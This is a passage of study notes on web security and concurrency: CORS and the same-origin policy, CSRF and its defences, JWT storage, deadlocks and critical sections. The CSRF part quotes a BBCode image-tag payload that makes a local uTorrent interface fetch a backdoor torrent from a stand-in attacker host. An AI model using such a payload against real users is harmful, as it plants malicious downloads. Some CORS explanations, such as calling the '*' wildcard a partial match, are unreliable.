CORS is a security standard implemented by **browsers** that enable scripts running in browsers to access resources located outside of the browser’s domain.

The CORS protocol consists of a set of headers that indicates *whether a response can be shared cross-origin*. For requests that are more involved than what is possible with HTML’s form element, a CORS-preflight request is performed, to ensure the request’s current URL supports the CORS protocol.


The CORS protocol was defined to relax the default security policy called the **Same-Origin Policy** (SOP) used by the browsers to protect their resources.

The **Same-Origin Policy** permits the browser to load resources only from a server hosted in the same-origin as the browser.

The SOP was defined in the early years of the web and turned out to be too restrictive for the new age applications where we often need to fetch different kinds of resources from multiple origins.

The CORS protocol is implemented by all modern browsers to allow controlled access to resources located outside of the browser’s origin.

An Origin in the context of CORS consists of three elements:

URI scheme, for example http:// or https://
Hostname like www.xyz.com
Port number like 8000 or 80 (default HTTP port)
We consider two URLs to be of the same origin only if all three elements match.

![Cross-Origin Example](https://reflectoring.io/images/posts/cors/CORS-terms_hub1ff3b62975180e07fd356e72f624b75_46574_731x0_resize_box_3.png)


The following steps happen, when a user types in a URL: http://www.example.com/index.html in the browser:

1) The browser sends the request to a server in a domain named www.example.com. We will call this server “Origin server” which hosts the page named index.html.
2) The origin server returns the page named index.html as a response to the browser.
3) The origin server also hosts other resources like the movies.json API in this example.
4) The browser can also fetch resources from a server in a different domain like www.xyz.com. We will call this server “Cross-Origin server”.
5) The browser uses Ajax technology with the built-in XMLHttpRequest object, or since 2017 the new fetch function within JavaScript to load content on the screen without refreshing the page.

![Sequence diagram](https://reflectoring.io/images/posts/cors/seq_hu6c400d8ec4657ce7893adab21f39f421_24900_651x0_resize_box_3.png)


The CORS protocol is enforced only by the browsers. The browser does this by sending a set of CORS headers to the cross-origin server which returns specific header values in the response. Based on the header values returned in the response from the cross-origin server, the browser provides access to the response or blocks the access by showing a CORS error in the browser console.

When a request for fetching a resource is made from a web page, the browser detects whether the request is to the origin server or the cross-origin server and applies the CORS policy if the request is for the cross-origin server.

The browser sends a header named Origin with the request to the cross-origin server (preflight request). The cross-origin server processes this request and sends back a header named Access-Control-Allow-Origin in the response.
The browser checks the value of the Access-Control-Allow-Origin header in the response and if the value of the Access-Control-Allow-Origin header is the same as the Origin header sent in the request, then the actual request for the resource is made and fetched from the server.

The cross-origin server can also use wild cards like * as the value of the Access-Control-Allow-Origin header to represent a partial match with the value of the Origin header received in the request.

#### How can you initialize a CSRF attack?

https://en.wikipedia.org/wiki/Cross-site_request_forgery
CSRF stands for cross-site request forgery, or one-click attack or session riding. It is a type of malicious exploit of a website or web app where unauthorized commands are submitted from a user that the web app trusts.

When a user that is logged in to another site, clicks a malicious link on another site that makes a request to the logged-in site, bypassing authentication (because it is done via cookie, and the cookie is sent with the request automatically to the logged-in site's server). CSRF exploits the trust that a site has in a user's browser. In a CSRF attack, an innocent end user is **tricked** by an attacker **into submitting a web request that they did not intend**. This may cause actions to be performed on the website that can include inadvertent client or server data leakage, change of session state, or manipulation of an end user's account.

CSRF attacks using image tags are often made from Internet forums, where users are allowed to post images but not JavaScript, for example using BBCode:
```
[img]http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent[/img]
```

When accessing the attack link to the local uTorrent application at localhost:8080, the browser would also always automatically send any existing cookies for that domain. This general property of web browsers enables CSRF attacks to exploit their targeted vulnerabilities and execute hostile actions as long as the user is logged into the target website (in this example, the local uTorrent web interface) at the time of the attack.

Most CSRF prevention techniques work by embedding additional authentication data into requests that allows the web application to detect requests from unauthorized locations.
- Synchronizer token pattern,
- Cookie-to-header token,
- Double Submit Cookie,
- SameSite cookie attribute,
- Client-side safeguards (extensions, NoScript, etc.)


#### What is JWT used for? Where to store it on client side?

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA or ECDSA.

Although JWTs can be encrypted to also provide secrecy between parties, we will focus on signed tokens. Signed tokens can verify the integrity of the claims contained within it, while encrypted tokens hide those claims from other parties. When tokens are signed using public/private key pairs, the signature also certifies that only the party holding the private key is the one that signed it.

https://stackoverflow.com/questions/27067251/where-to-store-jwt-in-browser-how-to-protect-against-csrf
We need to store the JWT on the client computer. If we store it in a LocalStorage/SessionStorage then it can be easily grabbed by an XSS attack. If we store it in cookies then a hacker can use it (without reading it) in a CSRF attack and impersonate the user and contact our API and send requests to do actions or get information on behalf of a user.

But there are several ways to secure the JWT in cookies to not to be stolen easily (but there are still some advanced techniques to steal them). But if you wanna rely on LocalStorage/SessionStorage, then it can be accessed by a simple XSS attack.
Add `SameSite=strict` header to defeat CSRF + httpOnly

So to solve the CSRF problem, I use Double Submit Cookies in my application.

1) Store JWT in a HttpOnly cookie and used it in secure mode to transfer over HTTPS.

2) Most of CSRF attacks have a different origin or referrer header with your original host in their requests. So check if you have any of them in the header, are they coming from your domain or not! If not reject them. If both origin and referrer are not available in the request then no worries. You can rely on the result of X-XSRF-TOKEN header validation results which I explain in the next step.

3) While the browser will automatically supply your cookies for the domain of the request, there is one useful limitation: the JavaScript code that is running on a website cannot read the cookies of other websites. We can leverage this to create our CSRF solution. To prevent CSRF attacks, we must create an extra Javascript readable cookie which is called: XSRF-TOKEN. This cookie must be created when the user is logged in and should contain a random, un-guessable string. We also save this number in the JWT itself as a private claim. Every time the JavaScript application wants to make a request, it will need to read this token and send it along in a custom HTTP header. Because these operations (reading the cookie, setting the header) can only be done on the same domain of the JavaScript application, we can know that this is being done by a real user who is using our JavaScript application.

For CSRF prevention: Localstorage + Bearer token (does not protect from XSS attack).

Add `SameSite=strict` header to defeat CSRF + httpOnly


"Store your access token in memory and store your refresh token in the cookie"

Why is this safe from CSRF?

Although a form submit to /refresh_token will work and a new access token will be returned, the attacker can't read the response if they're using an HTML form. To prevent the attacker from successfully making a fetch or AJAX request and read the response, this requires the Authorization Server's CORS policy to be set up correctly to prevent requests from unauthorized websites.

You can read more about it here:
https://dev.to/cotter/localstorage-vs-cookies-all-you-need-to-know-about-storing-jwt-tokens-securely-in-the-front-end-15id


### Threaded programming

#### When do you need to use threads in an application?

- When I want to take advantage of the hardware (multiple CPU cores) and parallelize my code to distribute work across multiple processors. 
- To execute tasks concurrently.
- Parallel execution takes advantage of multiple processor cores executing instructions that do not need to wait for data from each other.
- When there are slow operations in the software (database access, network access, etc), multithreading allows an other process to run while waiting for these slower operations to complete.
- Threading has overhead, cost/benefit must be evaluated.
- Consider also the cost that multithreading has to the maintainability of your application. Threaded applications can be harder to debug, for example.

#### What is a daemon thread?

https://www.pythontutorial.net/python-concurrency/python-daemon-threads/

A daemon thread (background thread in C#) is a thread that executes tasks in the background. They are helpful for executing tasks that support non-daemon threads in the program. E.g. log information to a file in the background, scrap contents from a website in the background, auto-save the data into a database in the background. A daemon thread is useful for executing tasks that are not critical. The program can exit and doesn’t need to wait for the daemon threads to be completed. A daemon thread is automatically killed when the program exits.

#### What is the difference between concurrent and parallel execution of code?

https://medium.com/@itIsMadhavan/concurrency-vs-parallelism-a-brief-review-b337c8dac350

**Concurrency** means that an application is making progress on more than one task at the same time (concurrently). Well, if the computer only has one CPU the application may not make progress on more than one task at exactly the same time, but more than one task is being processed at a time inside the application. It does not completely finish one task before it begins the next. Concurrency means executing multiple tasks at the same time but not necessarily simultaneously. There are two tasks executing concurrently, but those are run in a 1-core CPU, so the CPU will decide to run a task first and then the other task or run half a task and half another task, etc. Two tasks can start, run, and complete in overlapping time periods i.e Task-2 can start even before Task-1 gets completed. It all depends on the system architecture.

**Parallelism** means that an application splits its tasks up into smaller subtasks which can be processed in parallel, for instance on multiple CPUs at the exact same time. It physically runs parts of tasks OR multiple tasks, at the same time using the multi-core infrastructure of CPU, by assigning one core to each task or sub-task. Parallelism is a specific kind of concurrency where tasks are really executed simultaneously.

**Concurrency** is about dealing with lots of things at once. **Parallelism** is about doing lots of things at once.

#### What is the most important problem developers are faced when using threads?

From ChatGPT:

One of the most important problems developers face when using threads is concurrency control and synchronization. Concurrent threads executing simultaneously can lead to various issues, such as race conditions, deadlocks, and data inconsistencies. These problems arise due to the non-deterministic nature of thread execution and the potential for threads to access and modify shared data concurrently.

Here are some specific challenges related to concurrency control and synchronization:

1) Race conditions: Race conditions occur when multiple threads access shared data concurrently, and the outcome depends on the relative timing of their execution. This can lead to unpredictable results and data corruption if proper synchronization mechanisms are not in place.

2) Deadlocks: Deadlocks happen when two or more threads are blocked forever, waiting for each other to release resources. It typically occurs when threads acquire multiple locks in different orders. Deadlocks can cause the entire application to freeze and become unresponsive.

3) Data inconsistencies: When multiple threads modify shared data simultaneously, it can result in inconsistent or corrupted data. For example, if two threads read a shared variable simultaneously, perform some calculations, and then update the variable, the final result may not be what was expected due to interleaved execution.

4) Synchronization overhead: Proper synchronization mechanisms, such as locks, semaphores, or monitors, are required to ensure thread safety and prevent concurrency issues. However, excessive or incorrect use of synchronization can introduce performance overhead, decrease scalability, and lead to potential bottlenecks in the application.

5) Debugging and testing: Concurrent programs are generally more difficult to debug and test compared to sequential programs. Reproducing and diagnosing issues related to thread interactions can be challenging due to their non-deterministic nature and the potential for timing-dependent bugs.

To address these challenges, developers need to have a solid understanding of concurrent programming concepts, synchronization techniques, and be familiar with threading libraries and frameworks provided by their programming languages. Additionally, adopting best practices, such as minimizing shared data, using thread-safe data structures, and employing proper synchronization strategies, can help mitigate these problems.


#### In what kind of situations can deadlocks occur?

https://www.techtarget.com/whatis/definition/deadlock

A deadlock is a situation in which two computer programs sharing the same resource are effectively preventing each other from accessing the resource, resulting in both programs ceasing to function.

```
Program 1 requests resource A and receives it.
Program 2 requests resource B and receives it.
Program 1 requests resource B and is queued up, pending the release of B.
Program 2 requests resource A and is queued up, pending the release of A.
```

Now neither program can proceed until the other program releases a resource. The operating system cannot know what action to take. At this point the only alternative is to abort (stop) one of the programs.

#### What are possible ways to prevent deadlocks from occurring?

https://stackoverflow.com/questions/15361810/how-to-find-out-deadlock-and-prevent-it-in-c-sharp

The simplest way to avoid deadlock is to use a timeout value. The Monitor class (system.Threading.Monitor) can set a timeout during acquiring a lock.

#### What does critical section or critical region mean in the context of concurrent programming?

https://www.educative.io/answers/what-is-the-critical-section-problem-in-operating-systems

The critical section refers to the segment of code where processes access shared resources, such as common variables and files, and perform write operations on them.

https://en.wikipedia.org/wiki/Critical_section

In concurrent programming, concurrent accesses to shared resources can lead to unexpected or erroneous behavior, so parts of the program where the shared resource is accessed need to be protected in ways that avoid the concurrent access. One way to do so is known as a critical section or critical region. This protected section cannot be entered by more than one process or thread at a time; others are suspended until the first leaves the critical section. Typically, the critical section accesses a shared resource, such as a data structure, a peripheral device, or a network connection, that would not operate correctly in the context of multiple concurrent accesses.

By carefully controlling which variables are modified inside and outside the critical section, concurrent access to the shared variable are prevented. A critical section is typically used when a multi-threaded program must update multiple related variables without a separate thread making conflicting changes to that data. In a related situation, a critical section may be used to ensure that a shared resource, for example, a printer, can only be accessed by one process at a time.